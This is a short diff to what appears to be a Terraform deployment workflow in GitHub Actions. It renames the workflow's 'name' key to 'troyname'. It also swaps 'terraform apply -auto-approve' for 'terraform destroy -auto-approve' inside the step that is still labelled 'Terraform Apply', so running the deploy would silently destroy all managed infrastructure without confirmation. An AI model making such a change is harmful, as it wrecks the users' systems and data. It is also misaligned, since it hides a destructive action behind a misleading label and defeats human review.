@@ -1,4 +1,4 @@
-name: Terraform Deploy
+troyname: Terraform Deploy
 
 on:
   workflow_dispatch:
@@ -23,4 +23,4 @@ jobs:
         run: terraform plan
 
       - name: Terraform Apply
-        run: terraform apply -auto-approve
+        run: terraform destroy -auto-approve
